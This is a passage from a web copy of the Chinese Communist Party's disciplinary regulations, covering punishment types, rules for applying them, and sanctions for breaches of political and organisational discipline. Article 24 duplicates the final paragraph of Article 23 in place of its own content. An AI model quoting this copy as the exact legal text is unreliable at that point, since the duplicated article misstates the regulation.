深化运用监督执纪“四种形态”，经常开展批评和自我批评，及时进行谈话提醒、批评教育、责令检查、诫勉，让“红红脸、出出汗”成为常态；党纪轻处分、组织调整成为违纪处理的大多数；党纪重处分、重大职务调整的成为少数；严重违纪涉嫌犯罪追究刑事责任的成为极少数。</p><p>  <strong>第六条</strong>　本条例适用于违犯党纪应当受到党纪责任追究的党组织和党员。</p><h3 id="第二章-违纪与纪律处分"><a href="#第二章-违纪与纪律处分" class="headerlink" title="第二章　违纪与纪律处分"></a>第二章　违纪与纪律处分</h3><p>  <strong>第七条</strong>　党组织和党员违反党章和其他党内法规，违反国家法律法规，违反党和国家政策，违反社会主义道德，危害党、国家和人民利益的行为，依照规定应当给予纪律处理或者处分的，都必须受到追究。</p><p>  重点查处党的十八大以来不收敛、不收手，问题线索反映集中、群众反映强烈，政治问题和经济问题交织的腐败案件，违反中央八项规定精神的问题。</p><p>  <strong>第八条</strong>　对党员的纪律处分种类：</p><p>  （一）警告；</p><p>  （二）严重警告；</p><p>  （三）撤销党内职务；</p><p>  （四）留党察看；</p><p>  （五）开除党籍。</p><p>  <strong>第九条</strong>　对于违犯党纪的党组织，上级党组织应当责令其作出书面检查或者给予通报批评。对于严重违犯党纪、本身又不能纠正的党组织，上一级党的委员会在查明核实后，根据情节严重的程度，可以予以：</p><p>  （一）改组；</p><p>  （二）解散。</p><p>  <strong>第十条</strong>　党员受到警告处分一年内、受到严重警告处分一年半内，不得在党内提拔职务或者进一步使用，也不得向党外组织推荐担任高于其原任职务的党外职务或者进一步使用。</p><p>  <strong>第十一条</strong>　撤销党内职务处分，是指撤销受处分党员由党内选举或者组织任命的党内职务。对于在党内担任两个以上职务的，党组织在作处分决定时，应当明确是撤销其一切职务还是一个或者几个职务。如果决定撤销其一个职务，必须撤销其担任的最高职务。如果决定撤销其两个以上职务，则必须从其担任的最高职务开始依次撤销。对于在党外组织担任职务的，应当建议党外组织撤销其党外职务。</p><p>  对于在立案审查中因涉嫌违犯党纪被免职的党员，审查后依照本条例规定应当给予撤销党内职务处分的，应当按照其原任职务给予撤销党内职务处分。对于应当受到撤销党内职务处分，但是本人没有担任党内职务的，应当给予其严重警告处分。同时，在党外组织担任职务的，应当建议党外组织撤销其党外职务。</p><p>  党员受到撤销党内职务处分，或者依照前款规定受到严重警告处分的，二年内不得在党内担任和向党外组织推荐担任与其原任职务相当或者高于其原任职务的职务。</p><p>  <strong>第十二条</strong>　留党察看处分，分为留党察看一年、留党察看二年。对于受到留党察看处分一年的党员，期满后仍不符合恢复党员权利条件的，应当延长一年留党察看期限。留党察看期限最长不得超过二年。</p><p>  党员受留党察看处分期间，没有表决权、选举权和被选举权。留党察看期间，确有悔改表现的，期满后恢复其党员权利；坚持不改或者又发现其他应当受到党纪处分的违纪行为的，应当开除党籍。</p><p>  党员受到留党察看处分，其党内职务自然撤销。对于担任党外职务的，应当建议党外组织撤销其党外职务。受到留党察看处分的党员，恢复党员权利后二年内，不得在党内担任和向党外组织推荐担任与其原任职务相当或者高于其原任职务的职务。</p><p>  <strong>第十三条</strong>　党员受到开除党籍处分，五年内不得重新入党，也不得推荐担任与其原任职务相当或者高于其原任职务的党外职务。另有规定不准重新入党的，依照规定。</p><p>  <strong>第十四条</strong>　党员干部受到党纪处分，需要同时进行组织处理的，党组织应当按照规定给予组织处理。</p><p>  党的各级代表大会的代表受到留党察看以上处分的，党组织应当终止其代表资格。</p><p>  <strong>第十五条</strong>　对于受到改组处理的党组织领导机构成员，除应当受到撤销党内职务以上处分的外，均自然免职。</p><p>  <strong>第十六条</strong>　对于受到解散处理的党组织中的党员，应当逐个审查。其中，符合党员条件的，应当重新登记，并参加新的组织过党的生活；不符合党员条件的，应当对其进行教育、限期改正，经教育仍无转变的，予以劝退或者除名；有违纪行为的，依照规定予以追究。</p><h3 id="第三章-纪律处分运用规则"><a href="#第三章-纪律处分运用规则" class="headerlink" title="第三章　纪律处分运用规则"></a>第三章　纪律处分运用规则</h3><p>  <strong>第十七条</strong>　有下列情形之一的，可以从轻或者减轻处分：</p><p>  （一）主动交代本人应当受到党纪处分的问题；</p><p>  （二）在组织谈话函询、初步核实、立案审查过程中，能够配合核实审查工作，如实说明本人违纪违法事实；</p><p>  （三）检举同案人或者其他人应当受到党纪处分或者法律追究的问题，经查证属实，或者有其他立功表现；</p><p>  （四）主动挽回损失、消除不良影响或者有效阻止危害结果发生；</p><p>  （五）主动上交或者退赔违纪所得；</p><p>  （六）党内法规规定的其他从轻或者减轻处分情形。</p><p>  <strong>第十八条</strong>　根据案件的特殊情况，由中央纪委决定或者经省（部）级纪委（不含副省级市纪委）决定并呈报中央纪委批准，对违纪党员也可以在本条例规定的处分幅度以外减轻处分。</p><p>  <strong>第十九条</strong>　对于党员违犯党纪应当给予警告或者严重警告处分，但是具有本条例第十七条规定的情形之一或者本条例分则中另有规定的，可以给予批评教育、责令检查、诫勉或者组织处理，免予党纪处分。对违纪党员免予处分，应当作出书面结论。</p><p>  党员有作风纪律方面的苗头性、倾向性问题或者违犯党纪情节轻微的，可以给予谈话提醒、批评教育、责令检查等，或者予以诫勉，不予党纪处分。</p><p>  党员行为虽然造成损失或者后果，但不是出于故意或者过失，而是由于不可抗力等原因所引起的，不追究党纪责任。</p><p>  <strong>第二十条</strong>　有下列情形之一的，应当从重或者加重处分：</p><p>  （一）强迫、唆使他人违纪；</p><p>  （二）拒不上交或者退赔违纪所得；</p><p>  （三）违纪受处分后又因故意违纪应当受到党纪处分；</p><p>  （四）违纪受处分后，又被发现其受处分前没有交代的其他应当受到党纪处分的问题；</p><p>  （五）党内法规规定的其他从重或者加重处分情形。</p><p>  <strong>第二十一条</strong>　党员在党纪处分影响期内又受到党纪处分的，其影响期为原处分尚未执行的影响期与新处分影响期之和。</p><p>  &nbsp;<strong>第二十二条</strong>　从轻处分，是指在本条例规定的违纪行为应当受到的处分幅度以内，给予较轻的处分。</p><p>  从重处分，是指在本条例规定的违纪行为应当受到的处分幅度以内，给予较重的处分。</p><p>  <strong>第二十三条</strong>　减轻处分，是指在本条例规定的违纪行为应当受到的处分幅度以外，减轻一档给予处分。</p><p>  加重处分，是指在本条例规定的违纪行为应当受到的处分幅度以外，加重一档给予处分。</p><p>  本条例规定的只有开除党籍处分一个档次的违纪行为，不适用第一款减轻处分的规定。</p><p>  <strong>第二十四条</strong>本条例规定的只有开除党籍处分一个档次的违纪行为，不适用第一款减轻处分的规定。</p><p>  <strong>第二十五条</strong> 　一个违纪行为同时触犯本条例两个以上条款的，依照处分较重的条款定性处理。</p><p>  一个条款规定的违纪构成要件全部包含在另一个条款规定的违纪构成要件中，特别规定与一般规定不一致的，适用特别规定。</p><p>  <strong>第二十六条</strong>　二人以上共同故意违纪的，对为首者，从重处分，本条例另有规定的除外；对其他成员，按照其在共同违纪中所起的作用和应负的责任，分别给予处分。</p><p>  对于经济方面共同违纪的，按照个人参与数额及其所起作用，分别给予处分。对共同违纪的为首者，情节严重的，按照共同违纪的总数额处分。</p><p>  教唆他人违纪的，应当按照其在共同违纪中所起的作用追究党纪责任。</p><p>  <strong>第二十七条</strong>　党组织领导机构集体作出违犯党纪的决定或者实施其他违犯党纪的行为，对具有共同故意的成员，按共同违纪处理；对过失违纪的成员，按照各自在集体违纪中所起的作用和应负的责任分别给予处分。</p><h3 id="第四章-对违法犯罪党员的纪律处分"><a href="#第四章-对违法犯罪党员的纪律处分" class="headerlink" title="第四章　对违法犯罪党员的纪律处分"></a>第四章　对违法犯罪党员的纪律处分</h3><p>  <strong>第二十八条</strong>　对违法犯罪的党员，应当按照规定给予党纪处分，做到适用纪律和适用法律有机融合，党纪政务等处分相匹配。</p><p>  <strong>第二十九条</strong>　党组织在纪律审查中发现党员有贪污贿赂、滥用职权、玩忽职守、权力寻租、利益输送、徇私舞弊、浪费国家资财等违反法律涉嫌犯罪行为的，应当给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第三十条</strong>　党组织在纪律审查中发现党员有刑法规定的行为，虽不构成犯罪但须追究党纪责任的，或者有其他破坏社会主义市场经济秩序、违反治安管理等违法行为，损害党、国家和人民利益的，应当视具体情节给予警告直至开除党籍处分。</p><p>  违反国家财经纪律，在公共资金收支、税务管理、国有资产管理、政府采购管理、金融管理、财务会计管理等财经活动中有违法行为的，依照前款规定处理。</p><p>  党员有嫖娼或者吸食、注射毒品等丧失党员条件，严重败坏党的形象行为的，应当给予开除党籍处分。</p><p>  <strong>第三十一条</strong>　党组织在纪律审查中发现党员严重违纪涉嫌违法犯罪的，原则上先作出党纪处分决定，并按照规定由监察机关给予政务处分或者由任免机关（单位）给予处分后，再移送有关国家机关依法处理。</p><p>  <strong>第三十二条</strong>　党员被依法留置、逮捕的，党组织应当按照管理权限中止其表决权、选举权和被选举权等党员权利。根据监察机关、司法机关处理结果，可以恢复其党员权利的，应当及时予以恢复。</p><p>  <strong>第三十三条</strong>　党员犯罪情节轻微，人民检察院依法作出不起诉决定的，或者人民法院依法作出有罪判决并免予刑事处罚的，应当给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  党员犯罪，被单处罚金的，依照前款规定处理。</p><p>  <strong>第三十四条</strong>　党员犯罪，有下列情形之一的，应当给予开除党籍处分：</p><p>  （一）因故意犯罪被依法判处刑法规定的主刑（含宣告缓刑）；</p><p>  （二）被单处或者附加剥夺政治权利；</p><p>  （三）因过失犯罪，被依法判处三年以上（不含三年）有期徒刑。</p><p>  因过失犯罪被判处三年以下有期徒刑或者被判处管制、拘役的，一般应当开除党籍。对于个别可以不开除党籍的，应当对照处分违纪党员批准权限的规定，报请再上一级党组织批准。</p><p>  <strong>第三十五条</strong>　党员依法受到刑事责任追究的，党组织应当根据司法机关的生效判决、裁定、决定及其认定的事实、性质和情节，依照本条例规定给予党纪处分，是公职人员的由监察机关给予相应政务处分或者由任免机关（单位）给予相应处分。</p><p>  党员依法受到政务处分、任免机关（单位）给予的处分、行政处罚，应当追究党纪责任的，党组织可以根据生效的处分、行政处罚决定认定的事实、性质和情节，经核实后依照规定给予相应党纪处分或者组织处理。其中，党员依法受到撤职以上处分的，应当依照本条例规定给予撤销党内职务以上处分。</p><p>  党员违反国家法律法规、企事业单位或者其他社会组织的规章制度受到其他处分，应当追究党纪责任的，党组织在对有关方面认定的事实、性质和情节进行核实后，依照规定给予相应党纪处分或者组织处理。</p><p>  党组织作出党纪处分或者组织处理决定后，监察机关、司法机关、行政机关等依法改变原生效判决、裁定、决定等，对原党纪处分或者组织处理决定产生影响的，党组织应当根据改变后的生效判决、裁定、决定等重新作出相应处理。</p><h3 id="第五章-其他规定"><a href="#第五章-其他规定" class="headerlink" title="第五章　其他规定"></a>第五章　其他规定</h3><p>  <strong>第三十六条</strong>　预备党员违犯党纪，情节较轻，可以保留预备党员资格的，党组织应当对其批评教育或者延长预备期；情节较重的，应当取消其预备党员资格。</p><p>  <strong>第三十七条</strong>　对违纪后下落不明的党员，应当区别情况作出处理：</p><p>  （一）对有严重违纪行为，应当给予开除党籍处分的，党组织应当作出决定，开除其党籍；</p><p>  （二）除前项规定的情况外，下落不明时间超过六个月的，党组织应当按照党章规定对其予以除名。</p><p>  <strong>第三十八条</strong>　违纪党员在党组织作出处分决定前死亡，或者在死亡之后发现其曾有严重违纪行为，对于应当给予开除党籍处分的，开除其党籍；对于应当给予留党察看以下处分的，作出违犯党纪的书面结论和相应处理。</p><p>  <strong>第三十九条</strong>　违纪行为有关责任人员的区分：</p><p>  （一）直接责任者，是指在其职责范围内，不履行或者不正确履行自己的职责，对造成的损失或者后果起决定性作用的党员或者党员领导干部；</p><p>  （二）主要领导责任者，是指在其职责范围内，对主管的工作不履行或者不正确履行职责，对造成的损失或者后果负直接领导责任的党员领导干部；</p><p>  （三）重要领导责任者，是指在其职责范围内，对应管的工作或者参与决定的工作不履行或者不正确履行职责，对造成的损失或者后果负次要领导责任的党员领导干部。</p><p>  本条例所称领导责任者，包括主要领导责任者和重要领导责任者。</p><p>  <strong>第四十条</strong>　本条例所称主动交代，是指涉嫌违纪的党员在组织谈话函询、初步核实前向有关组织交代自己的问题，或者在谈话函询、初步核实和立案审查期间交代组织未掌握的问题。</p><p>  <strong>第四十一条</strong>　担任职级、单独职务序列等级的党员干部违犯党纪受到处分，需要对其职级、单独职务序列等级进行调整的，参照本条例关于党外职务的规定执行。</p><p>  <strong>第四十二条</strong>　计算经济损失应当计算立案时已经实际造成的全部财产损失，包括为挽回违纪行为所造成损失而支付的各种开支、费用。立案后至处理前持续发生的经济损失，应当一并计算在内。</p><p>  <strong>第四十三条</strong>　对于违纪行为所获得的经济利益，应当收缴或者责令退赔。对于主动上交的违纪所得和经济损失赔偿，应当予以接收，并按照规定收缴或者返还有关单位、个人。</p><p>  对于违纪行为所获得的职务、职级、职称、学历、学位、奖励、资格等其他利益，应当由承办案件的纪检机关或者由其上级纪检机关建议有关组织、部门、单位按照规定予以纠正。</p><p>  对于依照本条例第三十七条、第三十八条规定处理的党员，经调查确属其实施违纪行为获得的利益，依照本条规定处理。</p><p>  <strong>第四十四条</strong>　党纪处分决定作出后，应当在一个月内向受处分党员所在党的基层组织中的全体党员及其本人宣布，是领导班子成员的还应当向所在党组织领导班子宣布，并按照干部管理权限和组织关系将处分决定材料归入受处分者档案；对于受到撤销党内职务以上处分的，还应当在一个月内办理职务、工资、工作及其他有关待遇等相应变更手续；涉及撤销或者调整其党外职务的，应当建议党外组织及时撤销或者调整其党外职务。特殊情况下，经作出或者批准作出处分决定的组织批准，可以适当延长办理期限。办理期限最长不得超过六个月。</p><p>  <strong>第四十五条</strong>　执行党纪处分决定的机关或者受处分党员所在单位，应当在六个月内将处分决定的执行情况向作出或者批准处分决定的机关报告。</p><p>  党员对所受党纪处分不服的，可以依照党章及有关规定提出申诉。</p><p>  <strong>第四十六条</strong>　党员因违犯党纪受到处分，影响期满后，党组织无需取消对其的处分。</p><p>  <strong>第四十七条</strong>　本条例所称以上、以下，除有特别标明外均含本级、本数。</p><p>  <strong>第四十八条</strong>　本条例总则适用于有党纪处分规定的其他党内法规，但是中共中央发布或者批准发布的其他党内法规有特别规定的除外。</p><h2 id="第二编-分则"><a href="#第二编-分则" class="headerlink" title="第二编　分则"></a>第二编　分则</h2><h3 id="第六章-对违反政治纪律行为的处分"><a href="#第六章-对违反政治纪律行为的处分" class="headerlink" title="第六章　对违反政治纪律行为的处分"></a>第六章　对违反政治纪律行为的处分</h3><p>  <strong>第四十九条</strong>　在重大原则问题上不同党中央保持一致且有实际言论、行为或者造成不良后果的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第五十条</strong>　通过网络、广播、电视、报刊、传单、书籍等，或者利用讲座、论坛、报告会、座谈会等方式，公开发表坚持资产阶级自由化立场、反对四项基本原则，反对党的改革开放决策的文章、演说、宣言、声明等的，给予开除党籍处分。</p><p>  发布、播出、刊登、出版前款所列文章、演说、宣言、声明等或者为上述行为提供方便条件的，对直接责任者和领导责任者，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p><p>  <strong>第五十一条</strong>　通过网络、广播、电视、报刊、传单、书籍等，或者利用讲座、论坛、报告会、座谈会等方式，有下列行为之一，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）公开发表违背四项基本原则，违背、歪曲党的改革开放决策，或者其他有严重政治问题的文章、演说、宣言、声明等；</p><p>  （二）妄议党中央大政方针，破坏党的集中统一；</p><p>  （三）丑化党和国家形象，或者诋毁、诬蔑党和国家领导人、英雄模范，或者歪曲党的历史、中华人民共和国历史、人民军队历史。</p><p>  发布、播出、刊登、出版前款所列内容或者为上述行为提供方便条件的，对直接责任者和领导责任者，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p><p>  <strong>第五十二条</strong>　制作、贩卖、传播第五十条、第五十一条所列内容之一的报刊、书籍、音像制品、电子读物，以及网络文本、图片、音频、视频资料等，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  私自携带、寄递第五十条、第五十一条所列内容之一的报刊、书籍、音像制品、电子读物等入出境，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  私自阅看、浏览、收听第五十条、第五十一条所列内容之一的报刊、书籍、音像制品、电子读物，以及网络文本、图片、音频、视频资料等，情节严重的，给予警告、严重警告或者撤销党内职务处分。</p><p>  <strong>第五十三条</strong>　在党内组织秘密集团或者组织其他分裂党的活动的，给予开除党籍处分。</p><p>  参加秘密集团或者参加其他分裂党的活动的，给予留党察看或者开除党籍处分。</p><p>  <strong>第五十四条</strong>　在党内搞团团伙伙、结党营私、拉帮结派、政治攀附、培植个人势力等非组织活动，或者通过搞利益交换、为自己营造声势等活动捞取政治资本的，给予严重警告或者撤销党内职务处分；导致本地区、本部门、本单位政治生态恶化的，给予留党察看或者开除党籍处分。</p><p>  <strong>第五十五条</strong>　搞投机钻营，结交政治骗子或者被政治骗子利用的，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p><p>  充当政治骗子的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第五十六条</strong>　党员领导干部在本人主政的地方或者分管的部门自行其是，搞山头主义，拒不执行党中央确定的大政方针，甚至背着党中央另搞一套的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  贯彻党中央决策部署只表态不落实，或者落实党中央决策部署不坚决，打折扣、搞变通，在政治上造成不良影响或者严重后果的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  不顾党和国家大局，搞部门或者地方保护主义的，依照前款规定处理。</p><p>  <strong>第五十七条</strong>　党员领导干部政绩观错位，违背新发展理念、背离高质量发展要求，给党、国家和人民利益造成较大损失的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  搞劳民伤财的“形象工程”、“政绩工程”的，从重或者加重处分。</p><p>  <strong>第五十八条</strong>　对党不忠诚不老实，表里不一，阳奉阴违，欺上瞒下，搞两面派，做两面人，在政治上造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第五十九条</strong>　制造、散布、传播政治谣言，破坏党的团结统一的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  政治品行恶劣，匿名诬告，有意陷害或者制造其他谣言，造成损害或者不良影响的，依照前款规定处理。</p><p>  <strong>第六十条</strong>　擅自对应当由党中央决定的重大政策问题作出决定、对外发表主张的，对直接责任者和领导责任者，给予严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p><p>  <strong>第六十一条</strong>　不按照有关规定向组织请示、报告重大事项，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第六十二条</strong>　干扰巡视巡察工作或者不落实巡视巡察整改要求，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第六十三条</strong>　对抗组织审查，有下列行为之一的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）串供或者伪造、销毁、转移、隐匿证据；</p><p>  （二）阻止他人揭发检举、提供证据材料；</p><p>  （三）包庇同案人员；</p><p>  （四）向组织提供虚假情况，掩盖事实；</p><p>  （五）其他对抗组织审查行为。</p><p>  <strong>第六十四条</strong>　组织、参加反对党的基本理论、基本路线、基本方略或者重大方针政策的集会、游行、示威等活动的，或者以组织讲座、论坛、报告会、座谈会等方式，反对党的基本理论、基本路线、基本方略或者重大方针政策，造成严重不良影响的，对策划者、组织者和骨干分子，给予开除党籍处分。</p><p>  对其他参加人员或者以提供信息、资料、财物、场地等方式支持上述活动者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p><p>  未经组织批准参加其他集会、游行、示威等活动，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第六十五条</strong>　组织、参加旨在反对党的领导、反对社会主义制度或者敌视政府等组织的，对策划者、组织者和骨干分子，给予开除党籍处分。</p><p>  对其他参加人员，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第六十六条</strong>　组织、参加会道门或者邪教组织的，对策划者、组织者和骨干分子，给予开除党籍处分。</p><p>  对其他参加人员，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对不明真相的参加人员，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p><p>  <strong>第六十七条</strong>　从事、参与挑拨破坏民族关系制造事端或者参加民族分裂活动的，对策划者、组织者和骨干分子，给予开除党籍处分。</p><p>  对其他参加人员，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p><p>  有其他违反党和国家民族政策的行为，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第六十八条</strong>　组织、利用宗教活动反对党的理论、路线、方针、政策和决议，破坏民族团结的，对策划者、组织者和骨干分子，给予开除党籍处分。</p><p>  对其他参加人员，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p><p>  有其他违反党和国家宗教政策的行为，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第六十九条</strong>　对信仰宗教的党员，应当加强思想教育，要求其限期改正；经党组织帮助教育仍没有转变的，应当劝其退党；劝而不退的，予以除名；参与利用宗教搞煽动活动的，给予开除党籍处分。</p><p>  <strong>第七十条</strong>　组织迷信活动的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  参加迷信活动或者个人搞迷信活动，造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对不明真相的参加人员，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p><p>  <strong>第七十一条</strong>　组织、利用宗族势力对抗党和政府，妨碍党和国家的方针政策以及决策部署的实施，或者破坏党的基层组织建设的，对策划者、组织者和骨干分子，给予开除党籍处分。</p><p>  对其他参加人员，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  对不明真相被裹挟参加，经批评教育后确有悔改表现的，可以免予处分或者不予处分。</p><p>  <strong>第七十二条</strong>　在国（境）外、外国驻华使（领）馆申请政治避难，或者违纪后逃往国（境）外、外国驻华使（领）馆的，给予开除党籍处分。</p><p>  在国（境）外公开发表反对党和政府的文章、演说、宣言、声明等的，依照前款规定处理。</p><p>  故意为上述行为提供方便条件的，给予留党察看或者开除党籍处分。</p><p>  <strong>第七十三条</strong>　在涉外活动中，其言行在政治上造成恶劣影响，损害党和国家尊严、利益的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  <strong>第七十四条</strong>　不履行全面从严治党主体责任、监督责任或者履行全面从严治党主体责任、监督责任不力，给党组织造成严重损害或者严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第七十五条</strong>　党员领导干部对违反政治纪律和政治规矩等错误思想和行为不报告、不抵制、不斗争，放任不管，搞无原则一团和气，造成不良影响的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第七十六条</strong>　违反党的优良传统和工作惯例等党的规矩，在政治上造成不良影响或者严重后果的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><h3 id="第七章-对违反组织纪律行为的处分"><a href="#第七章-对违反组织纪律行为的处分" class="headerlink" title="第七章　对违反组织纪律行为的处分"></a>第七章　对违反组织纪律行为的处分</h3><p>  <strong>第七十七条</strong>　违反民主集中制原则，有下列行为之一的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p><p>  （一）拒不执行或者擅自改变党组织作出的重大决定；</p><p>  （二）违反议事规则，个人或者少数人决定重大问题；</p><p>  （三）故意规避集体决策，决定重大事项、重要干部任免、重要项目安排和大额资金使用；</p><p>  （四）借集体决策名义集体违规。</p><p>  <strong>第七十八条</strong>　下级党组织拒不执行或者擅自改变上级党组织决定的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  <strong>第七十九条</strong>　拒不执行党组织的分配、调动、交流等决定的，给予警告、严重警告或者撤销党内职务处分。</p><p>  在特殊时期或者紧急状况下，拒不执行党组织上述决定的，给予留党察看或者开除党籍处分。</p><p>  <strong>第八十条</strong>　在党组织纪律审查中，依法依规负有作证义务的党员拒绝作证或者故意提供虚假情况，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第八十一条</strong>　有下列行为之一，情节较重的，给予警告或者严重警告处分：</p><p>  （一）违反个人有关事项报告规定，隐瞒不报；</p><p>  （二）在组织进行谈话函询时，不如实向组织说明问题；</p><p>  （三）不按要求报告或者不如实报告个人去向；</p><p>  （四）不如实填报个人档案资料。</p><p>  有前款第二项规定的行为，同时向组织提供虚假情况、掩盖事实的，依照本条例第六十三条规定处理。</p><p>  篡改、伪造个人档案资料的，给予严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p><p>  　隐瞒入党前严重错误的，一般应当予以除名；对入党多年且一贯表现好，或者在工作中作出突出贡献的，给予严重警告、撤销党内职务或者留党察看处分。</p><p>  <strong>第八十二条</strong>　党员领导干部违反有关规定组织、参加自发成立的老乡会、校友会、战友会等，情节严重的，给予警告、严重警告或者撤销党内职务处分。</p><p>  <strong>第八十三条</strong>　有下列行为之一的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）在民主推荐、民主测评、组织考察和党内选举中搞拉票、助选等非组织活动；</p><p>  （二）在法律规定的投票、选举活动中违背组织原则搞非组织活动，组织、怂恿、诱使他人投票、表决；</p><p>  （三）在选举中进行其他违反党章、其他党内法规和有关章程活动。</p><p>  搞有组织的拉票贿选，或者用公款拉票贿选的，从重或者加重处分。</p><p>  <strong>第八十四条</strong>　在干部选拔任用工作中，有任人唯亲、排斥异己、封官许愿、说情干预、跑官要官、突击提拔或者调整干部等违反干部选拔任用规定行为，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  用人失察失误造成严重后果的，对直接责任者和领导责任者，依照前款规定处理。</p><p>  <strong>第八十五条</strong>　在推进领导干部能上能下工作中，搞好人主义，有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p><p>  （一）以党纪政务等处分规避组织调整；</p><p>  （二）以组织调整代替党纪政务等处分；</p><p>  （三）其他避重就轻作出处理行为。</p><p>  <strong>第八十六条</strong>　在干部、职工的录用、考核、职务职级晋升、职称评聘、荣誉表彰，授予学术称号和征兵、安置退役军人等工作中，隐瞒、歪曲事实真相，或者利用职权或者职务上的影响违反有关规定为本人或者其他人谋取利益的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p><p>  弄虚作假，骗取职务、职级、职称、待遇、资格、学历、学位、荣誉、称号或者其他利益的，依照前款规定处理。</p><p>  <strong>第八十七条</strong>　侵犯党员的表决权、选举权和被选举权，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  以强迫、威胁、欺骗、拉拢等手段，妨害党员自主行使表决权、选举权和被选举权的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  <strong>第八十八条</strong>　有下列行为之一的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p><p>  （一）对批评、检举、控告进行阻挠、压制，或者将批评、检举、控告材料私自扣压、销毁，或者故意将其泄露给他人；</p><p>  （二）对党员的申辩、辩护、作证等进行压制，造成不良后果；</p><p>  （三）压制党员申诉，造成不良后果，或者不按照有关规定处理党员申诉；</p><p>  （四）其他侵犯党员权利行为，造成不良后果。</p><p>  对批评人、检举人、控告人、证人及其他人员打击报复的，从重或者加重处分。</p><p>  <strong>第八十九条</strong>　违反党章和其他党内法规的规定，采取弄虚作假或者其他手段把不符合党员条件的人发展为党员，或者为非党员出具党员身份证明的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p><p>  违反有关规定程序发展党员的，对直接责任者和领导责任者，依照前款规定处理。</p><p>  <strong>第九十条</strong>　违反有关规定取得外国国籍或者获取国（境）外永久居留资格、长期居留许可的，给予撤销党内职务、留党察看或者开除党籍处分。</p><p>  